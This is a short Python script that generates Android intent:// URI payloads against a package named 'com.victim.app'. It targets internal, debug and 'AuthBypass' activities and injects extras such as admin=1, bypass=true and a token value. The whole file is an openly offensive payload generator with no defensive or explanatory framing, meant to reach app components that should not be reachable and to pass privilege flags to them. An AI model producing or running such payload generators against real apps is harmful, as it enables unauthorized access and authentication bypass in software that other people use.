def generate_intent_payloads(target_package, components, extras):
    payloads = []

    for component in components:
        for key, value in extras.items():
            uri = (
                "intent://dummy#Intent;"
                f"scheme=myapp;"
                f"package={target_package};"
                f"component={target_package}/{component};"
                f"S.{key}={value};"
                "end"
            )
            payloads.append(uri)
    return payloads


if __name__ == "__main__":
    target_package = "com.victim.app"
    components = [
        ".InternalActivity",
        ".DebugActivity",
        ".AuthBypassActivity"
    ]

    extras = {
        "admin": "1",
        "bypass": "true",
        "token": "secret123"
    }

    payloads = generate_intent_payloads(target_package, components, extras)

    print("=== Generated intent:// payloads ===\n")
    for payload in payloads:
        print(payload + "\n")
